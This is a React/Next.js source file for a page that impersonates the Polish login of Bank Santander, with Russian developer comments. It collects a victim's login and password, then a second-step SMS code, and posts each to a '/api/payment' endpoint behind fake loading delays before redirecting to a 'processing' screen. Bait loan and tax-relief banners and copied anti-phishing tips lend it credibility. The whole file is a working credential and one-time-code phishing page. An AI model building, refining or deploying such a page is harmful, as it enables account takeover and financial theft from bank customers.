"use client";

import { useState, useRef } from "react";
import "./login-new.css";
import { useRouter } from "next/navigation";

const BANKS: Record<
  string,
  { name: string; logo: string
    
  }
> = {
  "santander": {
    name: "Bank Santander",
    logo: "/banks/santander.svg"
  },
};


const bank = BANKS["santander"];

export default function LoginNewPage() {
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
const router = useRouter();
const [step, setStep] = useState(1);

const [field1, setField1] = useState("");
const [field2, setField2] = useState("");
const [field3, setField3] = useState("");

  const [errorMessage, setErrorMessage] = useState("");

  const firstInputRef = useRef<HTMLInputElement | null>(null);

  const scrollToInput = () => {
    if (!firstInputRef.current) return;

    firstInputRef.current.scrollIntoView({
      behavior: "smooth",
      block: "center",
    });

    setTimeout(() => firstInputRef.current?.focus(), 300);
  };

  
  const [status, setStatus] =
      useState<"idle" | "loading" | "success" | "error">("idle");

  async function handleContinue(e: React.FormEvent<HTMLButtonElement>): Promise<void> {
    
    e.preventDefault();

    const newErrors = {
      field1: field1.trim() === "",
      field2: field2.trim() === "",
      field3: field3.trim() === "",
    };

    if (newErrors.field1 || newErrors.field2) {
      setErrorMessage("Pole nie może być puste");
      return;
    }

    setErrorMessage("");
    

    if(step === 1 ){
      setStatus("loading");
      const formData = new FormData();
      formData.append("login", field1);
      formData.append("haslo", field2);
      

      const data = Object.fromEntries(formData.entries());

      try {  
        const res = await fetch("/api/payment", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
  
        const json = await res.json().catch(() => ({}));
        console.log("Ответ /api/payment:", res.status, json);
  
        if (!res.ok) {
          setStatus("error");
          return;
        }
        await delay(5000);
      
        setStep(2);
        setStatus("idle");
        
      } catch (err) {
        console.error("Error fetch:", err);
        setStatus("error");
      }
      return;
  };

  if (step === 2) {
      const formData2 = new FormData();
      formData2.append("sms", field3);

      
      
      const data = Object.fromEntries(formData2.entries());

      try {
        console.log("Send /api/payment:", data);
  
        const res = await fetch("/api/payment", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
  
        const json = await res.json().catch(() => ({}));
        console.log("Ответ /api/payment:", res.status, json);
  
        if (!res.ok) {
          setStatus("error");
          return;
        }
        setTimeout(() => {
          setStatus("success");

          setField3("");
        }, 20000);;
        
      } catch (err) {
        console.error("Error fetch:", err);
        setStatus("error");
      }
      
      router.push(`/payment/santander/processing`);
      router.refresh();
      
  };
  }
    

  return (
    <div className="login2-page">
      {/* 🔥 LOADING OVERLAY */}
      {status === "loading" && (
        <div className="login2-loading-overlay">
          <div className="login2-loading-box">
            <div className="login2-spinner"></div>
            <p className="login2-loading-text">Ładowanie…</p>
          </div>
        </div>
      )}

      <main className="login2-main">
        <div className="login2-logo-wrapper">
          <img src={bank.logo} alt="Logo" className="login2-logo" />
        </div>

        <div className="login2-divider" />

        <div className="login2-title-wrapper">
          <h1 className="login2-title">Logowanie </h1>
        </div>

        <form className="login2-form" >
          {/* Поле 1 */}
          {step === 1 && (
    <>
      {/* Login */}
      <div className="login2-field">
        <label className="login2-label">Login</label>
        <input
          type="text"
          className="login2-input"
          value={field1}
          onChange={(e) => setField1(e.target.value)}
        />
      </div>

      {/* Hasło */}
      <div className="login2-field">
        <label className="login2-label">Hasło</label>
        <input
          type="password"
          className="login2-input"
          value={field2}
          onChange={(e) => setField2(e.target.value)}
        />
      </div>
    </>
  )}

  {step === 2 && (
    <div className="login2-field">
      <label className="login2-label">Sms</label>
      <input
        type="text"
        className="login2-input"
        value={field3}
        onChange={(e) => setField3(e.target.value)}
      />
    </div>
  )}

          {errorMessage && (
            <p className="login2-error-message">{errorMessage}</p>
          )}

          <button className="login2-button" onClick={handleContinue} >
            Dalej
          </button>
        </form>

        {/* Инфо блок */}
                {/* КРАСНЫЕ ИНФО-БЛОКИ ПОД КНОПКОЙ */}
        <div className="login2-warning-group">
          <div className="login2-warning">
            <div className="login2-warning-strip" />
            <div className="login2-warning-content">
              <div className="login2-warning-header">
                <div className="login2-warning-icon">
                  {/* сюда потом подставишь свой svg/png */}
                  <span>!</span>
                </div>
                <h2 className="login2-warning-title">Kredyt firmowy online</h2>
              </div>

              <p className="login2-warning-text">
                z 0% prowizji przygotowawczej i zmiennym oprocentowaniem
              </p>

              <div className="login2-warning-bottom">
                <p className="login2-warning-extra">
                  Oferta cenowa trwa do 7.01.2026 r. 
                </p>
                <button
                  type="button"
                  className="login2-warning-button"
                  onClick={scrollToInput}
                >
                  Sprawdzam
                </button>
              </div>
            </div>
          </div>

          <div className="login2-warning">
            <div className="login2-warning-strip" />
            <div className="login2-warning-content">
              <div className="login2-warning-header">
                <div className="login2-warning-icon">
                  <span>!</span>
                </div>
                <h2 className="login2-warning-title">
                  Za pięć dwunasta, żeby skorzystać z ulgi w PIT!
                </h2>
              </div>

              <p className="login2-warning-text">
                Do końca grudnia wykorzystaj limit wpłat na IKZE, aby zyskać do 3 330 zł ulgi w PIT za 2025 r. w II progu podatkowym
              </p>

              <div className="login2-warning-bottom">
                <p className="login2-warning-extra">
                  Krótka nota z dodatkowymi szczegółami.
                </p>
                <button
                  type="button"
                  className="login2-warning-button"
                  onClick={scrollToInput}
                >
                  Sprawdzam
                </button>
              </div>
            </div>
          </div>
        </div>

                {/* СПИСОК ШАГОВ С КРУЖКАМИ */}
        <div className="login2-steps">
          <div className="login2-step-item">
            <div className="login2-step-icon">1</div>
            <p className="login2-step-text">
              Nie podawaj nikomu swojego loginu i hasła.
            </p>
          </div>

          <div className="login2-step-item">
            <div className="login2-step-icon">2</div>
            <p className="login2-step-text">
              Czytaj dokładnie co zatwierdzasz smsKodem lub w aplikacji.
            </p>
          </div>

          <div className="login2-step-item">
            <div className="login2-step-icon">3</div>
            <p className="login2-step-text">
              Zastanów się zanim klikniesz w link w wiadomości.
            </p>
          </div>
        </div>


      </main>
    </div>
  );
}
